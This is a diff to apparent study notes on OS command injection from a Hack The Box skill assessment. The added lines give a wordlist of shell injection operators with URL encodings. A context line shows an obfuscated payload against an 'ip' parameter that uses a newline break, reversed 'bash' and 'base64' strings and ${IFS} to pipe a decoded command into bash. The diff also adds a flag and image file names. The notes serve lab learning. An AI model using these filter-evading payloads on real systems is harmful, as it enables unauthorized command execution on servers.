@@ -34,6 +34,27 @@ app.get("/createfile", function(req, res){
 |Sub-Shell| ` `` `|`%60%60`|Both (Linux-only)|
 |Sub-Shell| `$()`|`%24%28%29`|Both (Linux-only)|
 
+>List of injection characters and matching URL encoded as wordlist:  
+
+```
+;
+%3b
+\n
+%0a
+&
+%26
+\|
+%7c
+&&
+%26%26
+\|\|
+%7c%7c
+``
+%60%60
+$()
+%24%28%29
+```  
+
 ---
 # Linux
 
@@ -184,4 +205,10 @@ ip=127.0.0.1%0a$(rev<<<'hsab')<<<$($(rev<<<'46esab')${IFS}-d<<<ZmluZCAvdXNyL3NoY
 >HTB{1nj3c73d_my_f1r57_c0mm4nd}
 
 1nj3c70r
+
+cmd-inject-skill-assess.png
+
+
+cmd-inject-skill-assess-landing-page.png
+
 
